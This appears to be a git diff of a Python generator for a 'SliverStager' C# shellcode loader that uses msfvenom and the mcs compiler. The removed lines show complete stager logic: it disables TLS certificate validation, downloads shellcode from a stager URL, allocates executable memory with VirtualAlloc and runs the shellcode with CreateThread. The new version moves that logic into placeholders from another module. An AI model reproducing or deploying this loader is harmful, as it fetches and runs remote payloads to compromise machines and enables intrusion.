@@ -1,4 +1,5 @@
 #!/bin/env python3
+from ak import *
 import os
 import subprocess
 
@@ -14,6 +15,7 @@ def get_shellcode(msfvenom_cmd):
   return shellcode
 
 def generate(stager_url):
+  url_dl_code = URL_DL_CODE.format(STAGER_URL=STAGER_URL)
 
   template = """
 using System;
@@ -24,47 +26,20 @@ namespace SliverStager
 {{
     public class Stager
     {{
-        private static string url = "{stager_url}";
-
+        {START_SHELLCODE_IMPORT}
+        {ARCH_DETECTION}
         public static void Main()
         {{
-            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
-            System.Net.WebClient client = new System.Net.WebClient();
-            byte[] shellcode = client.DownloadData(url);
-
-            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
-            IntPtr hThread = IntPtr.Zero;
-            UInt32 threadId = 0;
-            IntPtr pinfo = IntPtr.Zero;
-            // execute native code
-            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
-            return;
+            {URL_DL_CODE}
+            {START_SHELLCODE}
         }}
 
-        private static UInt32 MEM_COMMIT = 0x3000;
-        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
-        [DllImport("kernel32")]
-        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
-        [DllImport("kernel32")]
-        private static extern IntPtr CreateThread(
-          UInt32 lpThreadAttributes,
-          UInt32 dwStackSize,
-          UInt32 lpStartAddress,
-          IntPtr param,
-          UInt32 dwCreationFlags,
-          ref UInt32 lpThreadId
-        );
-
-        [DllImport("kernel32")]
-        private static extern UInt32 WaitForSingleObject(
-          IntPtr hHandle,
-          UInt32 dwMilliseconds
-        );
     }}
 }}
-  """.format(stager_url=stager_url)
+  """.format(URL_DL_CODE=url_dl_code,
+             ARCH_DETECTION=ARCH_DETECTION,
+             START_SHELLCODE_IMPORT=START_SHELLCODE_IMPORT,
+             START_SHELLCODE=START_SHELLCODE)
 
   print(template)
   f = open(BASE_FILENAME + ".cs", "w")
@@ -78,15 +53,19 @@ def compile():
   cmd = f"mcs {BASE_FILENAME}.cs"
   os.system(cmd)
 
-def main():
+def generate_shellcode():
   shellcode = get_shellcode(MSFVENOM_CMD)
-  generate(STAGER_URL)
-  compile() 
-    
-  f = open(BASE_FILENAME + '.raw', 'wb')
+
+  filename = BASE_FILENAME + '.sc'
+  f = open(filename, 'wb')
   f.write(shellcode)
   f.close()
+  print("Wrote shellcode to " + filename)
 
+def main():
+  generate_shellcode()
+  generate(STAGER_URL)
+  compile()
 
 if __name__ == "__main__":
   main()
